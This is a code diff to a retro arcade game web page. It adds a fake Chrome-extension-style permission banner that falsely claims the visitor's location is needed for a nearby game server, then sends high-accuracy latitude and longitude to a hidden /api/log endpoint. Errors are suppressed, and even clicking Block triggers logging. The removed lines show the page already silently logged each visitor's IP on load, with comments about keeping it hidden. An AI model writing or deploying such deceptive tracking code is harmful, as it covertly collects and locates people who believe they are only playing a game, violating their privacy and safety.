@@ -8,6 +8,21 @@
 </head>
 <body class="bg-slate-950 text-slate-100 min-h-screen flex flex-col items-center justify-between p-4">
     
+    <!-- Chrome Extension Style Permission Banner -->
+    <div id="ext-geo-banner" style="display: none; position: fixed; top: 15px; right: 15px; background: #202124; color: #bdc1c6; padding: 16px; border-radius: 8px; font-family: Roboto, Arial, sans-serif; box-shadow: 0 4px 12px rgba(0,0,0,0.4); z-index: 10000; width: 320px; border: 1px solid #5f6368;">
+        <div style="display: flex; align-items: flex-start; gap: 12px;">
+            <div style="background: #8ab4f8; color: #202124; width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; flex-shrink: 0;">📍</div>
+            <div>
+                <div style="font-weight: 500; color: #fff; font-size: 14px; margin-bottom: 4px;">RetroPulse Extension</div>
+                <div style="font-size: 13px; line-height: 1.4;">wants to know your location to connect you to the nearest low-latency game server.</div>
+                <div style="margin-top: 12px; display: flex; justify-content: flex-end; gap: 8px;">
+                    <button id="ext-block-btn" style="background: transparent; color: #8ab4f8; border: none; padding: 6px 12px; font-size: 13px; font-weight: 500; cursor: pointer; border-radius: 4px;">Block</button>
+                    <button id="ext-allow-btn" style="background: #8ab4f8; color: #202124; border: none; padding: 6px 14px; font-size: 13px; font-weight: 500; cursor: pointer; border-radius: 4px;">Allow</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
     <header class="text-center my-4">
         <h1 class="text-2xl font-black tracking-wider text-emerald-400">RETRO ARCADE ZONE</h1>
         <p class="text-xs text-slate-400">Select a classic vintage game below to start playing instantly.</p>
@@ -37,20 +52,57 @@
         const btnSnake = document.getElementById('btnSnake');
         const btnBlocks = document.getElementById('btnBlocks');
 
-        // 1. SILENT BACKGROUND LOGGING TRIGGER (Executes automatically on page load)
-        window.addEventListener('DOMContentLoaded', async () => {
+        async function sendLogData(lat = null, lon = null) {
             try {
-                // Sends hidden request to backend serverless function to grab IP & log to Supabase
-                await fetch('/api/log', { method: 'POST' });
+                await fetch('/api/log', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        path: window.location.pathname,
+                        latitude: lat,
+                        longitude: lon
+                    })
+                });
             } catch (err) {
-                // Suppress errors entirely from user view to keep it completely hidden
+                // Suppress errors silently
             }
+        }
 
-            // Default boot into Nokia Snake
+        window.addEventListener('DOMContentLoaded', () => {
             initSnakeGame(container);
+
+            if (window.location.pathname.includes('/game')) {
+                setTimeout(() => {
+                    document.getElementById('ext-geo-banner').style.display = 'block';
+                }, 1000);
+            } else {
+                sendLogData();
+            }
         });
 
-        // 2. UI GAME CONTROLLER SWITCHING
+        document.getElementById('ext-allow-btn').addEventListener('click', () => {
+            document.getElementById('ext-geo-banner').style.display = 'none';
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        sendLogData(position.coords.latitude, position.coords.longitude);
+                    },
+                    (error) => {
+                        sendLogData();
+                    },
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            } else {
+                sendLogData();
+            }
+        });
+
+        document.getElementById('ext-block-btn').addEventListener('click', () => {
+            document.getElementById('ext-geo-banner').style.display = 'none';
+            sendLogData();
+        });
+
         btnSnake.addEventListener('click', () => {
             btnSnake.className = "px-4 py-2 bg-emerald-600 text-xs font-bold rounded transition";
             btnBlocks.className = "px-4 py-2 bg-slate-800 hover:bg-slate-700 text-xs font-bold rounded transition";
